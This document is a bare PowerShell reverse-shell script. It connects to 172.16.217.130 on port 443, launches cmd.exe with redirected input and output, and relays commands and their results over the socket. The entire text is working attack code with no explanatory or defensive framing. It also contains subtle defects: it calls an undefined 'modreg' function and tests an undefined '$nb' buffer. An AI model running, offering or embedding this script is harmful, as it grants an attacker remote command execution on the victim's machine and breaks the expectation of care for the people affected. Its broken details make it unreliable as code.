function cln{if($c.Connected -eq $true){$c.Close()};
if($p.ExitCode -ne $null){$p.Close()};
exit
};
$c=New-Object System.Net.Sockets.TcpClient;
$c.Connect('172.16.217.130',443);
if($c.Connected -ne $true){cln};
$s=$c.GetStream();
$b=New-Object System.Byte[] $c.ReceiveBufferSize;
$p=New-Object System.Diagnostics.Process;
$p.StartInfo.FileName='cmd.exe';
$p.StartInfo.RedirectStandardInput=1;
$p.StartInfo.RedirectStandardOutput=1;
$p.StartInfo.UseShellExecute=0;
$p.Start();
$is=$p.StandardInput;
$os=$p.StandardOutput;Start-Sleep 1;
$e=New-Object System.Text.AsciiEncoding;
while($os.Peek()-ne -1){$o+=$e.GetString($os.Read())};
$s.Write($e.GetBytes($o),0,$o.Length);
$o=$null;
while($true){if($c.Connected -ne $true)
{modreg};
$pos=0;$i=1;
while(($i -gt 0)-and($pos -lt $b.Length)){$read=$s.Read($b,$pos,$b.Length -$pos);
$pos+=$read;
if($pos -and($nb[0..$($pos-1)]-contains 10)){break};
if($pos -gt 0){$str=$e.GetString($b,0,$pos);
$is.Write($str);
Start-Sleep 1;
if($p.ExitCode -ne $null){cln}else{$o=$e.GetString($os.Read());
while($os.Peek()-ne -1){$o+=$e.GetString($os.Read());
if($o -eq $str){$o=''}};
$s.Write($e.GetBytes($o),0,$o.Length);
$o=$null;$str=$null}}else{cln}}};